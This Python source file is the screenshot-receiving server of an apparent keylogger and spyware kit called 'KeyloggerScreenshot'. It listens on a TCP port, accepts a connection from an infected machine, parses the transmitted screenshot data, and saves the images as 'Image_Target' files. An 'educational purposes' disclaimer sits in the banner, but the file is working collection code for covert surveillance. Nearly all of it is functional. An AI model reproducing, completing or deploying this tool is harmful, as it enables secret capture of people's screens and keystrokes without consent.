import ast
import socket
import os
import BetterPrinting as bp
from .Port_data import Ports

class ServerPhotos:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.full_msg = None

    def get_data(self, connection, mode, bytes):
        if mode == "r": self.full_msg = r""
        else: self.full_msg = b""
        # All the data is being stored in full_msg
        while True:
            msg = connection.recv(bytes)
            if len(msg) <= 0: break
            if mode == "r": self.full_msg += msg.decode()
            else: self.full_msg += msg
        return self.full_msg

    def get_double_names(self):
        get_all_images = [image for image in os.listdir() if "Image_Target" in image]
        if not get_all_images:
            return "Image_Target (1).png"

        else:
            number = len(get_all_images) + 1
            return f"Image_Target ({number}).png"

    def start(self):
        gui = """
    __ __              __                                 _____                                       __            __ 
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
            /____/           /____/ /____/    

                        ~Created by: Fawaz Bashiru~          
                        ~Write "python KLS_start.py -help" for help in the github version~   
                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
        """

        print(gui)
        bp.color("Cyan: ServerPhotos", "cyan")
        bp.color("Blue: ServerKeylogger", "magenta")
        bp.color("Green: ServerListener", "green")
        print("White: Timer\n")
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            anzahl = 0
            while True:
                bp.color("Waiting for connection...", "cyan")
                client_socket, address = server.accept()
                bp.color(f"\n\nConnection has been established with {address}", "cyan")
                # Data is in client_socket and the address is obviously in "ipaddress"
                full_msg = self.get_data(client_socket, "r", 12288)
                client_socket.close()
                server.close()
                this_data = ast.literal_eval(full_msg)
                # This makes a string to a datatype

                for filename, filename_data in this_data.items():
                    anzahl += 1
                    real_filename = self.get_double_names()
                    with open(real_filename, "ab") as file:
                        file.write(filename_data)

                # "anzahl" is for the amount of photos
                if anzahl > 1:
                    bp.color(f"{anzahl} Images has been saved to your working directory", "cyan")
                elif anzahl != 0:
                    bp.color(f"{anzahl} Image have been saved to your working directory", "cyan")
                # Detetcts how many Image have been saved to your directory


        except OSError:
            working_port = Ports.get_working_ports()
            if str(self.port) in working_port:
                bp.color(f"PLEASE USE AN OTHER PORT NUMBER FOR SERVERPHOTOS. PORT NUMBER: {self.port} already in use", "cyan")
                os._exit(0)
